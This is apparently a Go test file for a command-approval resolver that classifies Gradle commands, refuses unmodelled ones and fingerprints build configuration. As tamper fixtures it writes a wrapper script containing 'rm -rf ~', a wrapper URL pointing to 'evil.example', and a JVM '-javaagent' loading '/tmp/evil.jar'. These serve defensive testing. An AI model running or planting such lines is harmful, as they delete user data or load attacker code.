package resolver

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Vadym903/Intenter/internal/action"
	"github.com/Vadym903/Intenter/internal/version"
)

// gradleRepo is a workspace with a Gradle wrapper and build scripts.
func gradleRepo(t *testing.T) *repo {
	t.Helper()
	r := newRepo(t)
	r.write(t, "settings.gradle.kts", `rootProject.name = "demo"`)
	r.write(t, "build.gradle.kts", "plugins { java }\n")
	r.write(t, "gradle.properties", "org.gradle.caching=true\n")
	r.write(t, "gradlew", "#!/bin/sh\nexec gradle \"$@\"\n")
	r.write(t, "gradle/wrapper/gradle-wrapper.properties", "distributionUrl=https\\://services.gradle.org/x.zip\n")
	return r
}

func TestGradleTasksMapToOperations(t *testing.T) {
	r := gradleRepo(t)

	tests := []struct {
		command string
		op      action.SemanticOp
	}{
		{"./gradlew test", action.OpRunTests},
		{"./gradlew check", action.OpRunTests},
		{"./gradlew integrationTest", action.OpRunTests},
		{"./gradlew apiTest", action.OpRunTests},
		{"gradle test", action.OpRunTests},
		{"./gradlew build", action.OpBuild},
		{"./gradlew assemble", action.OpBuild},
		{"./gradlew compileJava", action.OpBuild},
		{"./gradlew jar", action.OpBuild},
		{"./gradlew clean", action.OpClean},
		{"./gradlew tasks", action.OpBuildToolInfo},
		{"./gradlew dependencies", action.OpBuildToolInfo},
		{"./gradlew :app:test", action.OpRunTests},
		{"./gradlew test --info --no-daemon", action.OpRunTests},
		{"./gradlew test --tests com.acme.MyTest", action.OpRunTests},
		{"./gradlew test -x checkstyleMain", action.OpRunTests},
		{"./gradlew test -Pfoo=bar -Dbaz=qux", action.OpRunTests},
		{"./gradlew clean build", action.OpBuild},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			out := r.resolveCommand(t, tt.command)
			if out.Status != action.StatusDeclared {
				t.Fatalf("status = %s (%s), want DECLARED", out.Status, out.StatusReason)
			}
			if out.SemanticOp != tt.op {
				t.Errorf("semantic op = %s, want %s", out.SemanticOp, tt.op)
			}
		})
	}
}

func TestGradleDeclaredEnvelope(t *testing.T) {
	r := gradleRepo(t)
	out := r.resolveCommand(t, "./gradlew test")

	summary := strings.Join(effectSummary(out), "\n")
	for _, want := range []string{
		"READ(recursive) .",
		"CREATE(recursive) ./build",
		"WRITE(recursive) ./build",
		"CREATE(recursive) ./.gradle",
		"READ(recursive) ~/.gradle",
		"WRITE(recursive) ~/.gradle",
		"NETWORK declared:dependency-registry",
		"EXECUTE program:DECLARED",
	} {
		if !strings.Contains(summary, want) {
			t.Errorf("declared envelope must include %q:\n%s", want, summary)
		}
	}
}

func TestGradleCleanDeletesBuildOutput(t *testing.T) {
	r := gradleRepo(t)
	out := r.resolveCommand(t, "./gradlew clean")

	summary := strings.Join(effectSummary(out), "\n")
	if !strings.Contains(summary, "DELETE(recursive) ./build") {
		t.Errorf("clean must delete the build directory:\n%s", summary)
	}
}

func TestGradleModuleTaskCoversTheModuleOutput(t *testing.T) {
	r := gradleRepo(t)
	if err := os.MkdirAll(filepath.Join(r.root, "app"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}

	out := r.resolveCommand(t, "./gradlew :app:test")
	summary := strings.Join(effectSummary(out), "\n")
	if !strings.Contains(summary, "./app/build") {
		t.Errorf("a module task writes the module's build directory:\n%s", summary)
	}
}

func TestGradleRefusesWhatItCannotModel(t *testing.T) {
	r := gradleRepo(t)

	tests := []struct {
		name    string
		command string
		reason  string
	}{
		{"publishing", "./gradlew publish", "publish"},
		{"publish among tasks", "./gradlew test publish", "publish"},
		{"unknown task", "./gradlew frobnicate", "frobnicate"},
		{"no task", "./gradlew", "without a task"},
		{"project directory flag", "./gradlew -p ../other test", "-p"},
		{"build file flag", "./gradlew -b other.gradle test", "-b"},
		{"init script", "./gradlew -I init.gradle test", "-I"},
		{"gradle user home", "./gradlew --gradle-user-home /tmp/g test", "--gradle-user-home"},
		{"jvm args property", "./gradlew test -Dorg.gradle.jvmargs=-Xmx1g", "-Dorg.gradle.jvmargs"},
		{"user home property", "./gradlew test -Duser.home=/tmp", "-Duser.home"},
		{"unknown flag", "./gradlew test --zap", "--zap"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out := r.resolveCommand(t, tt.command)
			if out.Status != action.StatusUnresolved {
				t.Fatalf("status = %s (%s), want UNRESOLVED", out.Status, out.StatusReason)
			}
			if !strings.Contains(out.StatusReason, tt.reason) {
				t.Errorf("reason = %q, want it to mention %q", out.StatusReason, tt.reason)
			}
		})
	}
}

func TestGradleConfigFingerprintCoversTheBuildFiles(t *testing.T) {
	// The declared envelope is only safe because a change to any file that
	// defines the build withdraws the approval (§15.5.2).
	r := gradleRepo(t)

	before := r.resolveAction(t, "./gradlew test")
	if _, ok := fingerprintValue(before, KeyGradleConfig); !ok {
		t.Fatalf("fingerprints = %+v, want gradle-config", before.Fingerprints)
	}

	changes := []struct {
		name string
		file string
		body string
	}{
		{"build script", "build.gradle.kts", "plugins { java }\ntasks.test { systemProperty(\"x\", \"y\") }\n"},
		{"settings", "settings.gradle.kts", `rootProject.name = "renamed"`},
		{"properties", "gradle.properties", "org.gradle.caching=false\n"},
		{"wrapper", "gradle/wrapper/gradle-wrapper.properties", "distributionUrl=https\\://evil.example/x.zip\n"},
		{"wrapper script", "gradlew", "#!/bin/sh\nrm -rf ~\n"},
		{"new subproject build file", "app/build.gradle.kts", "plugins { java }\n"},
		{"buildSrc logic", "buildSrc/src/main/kotlin/Custom.kt", "// build logic\n"},
	}

	previous, _ := fingerprintValue(before, KeyGradleConfig)
	for _, change := range changes {
		t.Run(change.name, func(t *testing.T) {
			r.write(t, change.file, change.body)
			after := r.resolveAction(t, "./gradlew test")
			current, ok := fingerprintValue(after, KeyGradleConfig)
			if !ok {
				t.Fatal("want a gradle-config fingerprint")
			}
			if current == previous {
				t.Errorf("changing %s must change gradle-config", change.file)
			}
			previous = current
		})
	}
}

// AG-143: the declared envelope already grants Gradle recursive read/write of
// ~/.gradle as its tool cache, but the fingerprint only covered the workspace
// side of Gradle's configuration — a change to the user-level init scripts or
// properties (which run for every invocation on the machine, unconditionally)
// did not withdraw an existing approval.
func TestGradleConfigFingerprintCoversUserLevelConfig(t *testing.T) {
	r := gradleRepo(t)
	before := r.resolveAction(t, "./gradlew test")
	previous, ok := fingerprintValue(before, KeyGradleConfig)
	if !ok {
		t.Fatalf("fingerprints = %+v, want gradle-config", before.Fingerprints)
	}

	changes := []struct {
		name string
		file string
		body string
	}{
		{"user gradle.properties", ".gradle/gradle.properties", "org.gradle.jvmargs=-javaagent:/tmp/evil.jar\n"},
		{"user init script", ".gradle/init.d/evil.gradle", "println(\"hi\")\n"},
	}

	for _, change := range changes {
		t.Run(change.name, func(t *testing.T) {
			r.writeHome(t, change.file, change.body)
			after := r.resolveAction(t, "./gradlew test")
			current, ok := fingerprintValue(after, KeyGradleConfig)
			if !ok {
				t.Fatal("want a gradle-config fingerprint")
			}
			if current == previous {
				t.Errorf("adding %s must change gradle-config", change.file)
			}
			previous = current
		})
	}
}

func TestGradleFingerprintIgnoresBuildOutput(t *testing.T) {
	// Generated output is not build logic; writing there must not invalidate
	// every approval in the project.
	r := gradleRepo(t)
	before := r.resolveAction(t, "./gradlew test")
	beforeHash, _ := fingerprintValue(before, KeyGradleConfig)

	r.write(t, "build/reports/index.html", "<html>report</html>")
	r.write(t, "build/generated.gradle", "// generated, not logic\n")
	r.write(t, ".gradle/cache.bin", "cache")

	after := r.resolveAction(t, "./gradlew test")
	afterHash, _ := fingerprintValue(after, KeyGradleConfig)
	if beforeHash != afterHash {
		t.Error("generated output must not change gradle-config")
	}
}

// resolveCommand recognizes a single command through the full recognizer set.
func (r *repo) resolveCommand(t *testing.T, command string) action.ResolvedCommand {
	t.Helper()
	act := r.resolveAction(t, command)
	if len(act.Commands) != 1 {
		t.Fatalf("resolve %q produced %d commands (%s)", command, len(act.Commands), act.StatusReason)
	}
	return act.Commands[0]
}

// resolveAction resolves a whole command line through the real pipeline.
func (r *repo) resolveAction(t *testing.T, command string) *action.ResolvedAction {
	t.Helper()
	out, _ := New(r.builder, version.EngineVersion).Resolve(action.ActionRequest{
		Dialect:    action.DialectPosix,
		RawCommand: command,
		Cwd:        r.root,
	})
	if out == nil {
		t.Fatalf("Resolve(%q) returned nothing", command)
	}
	return out
}
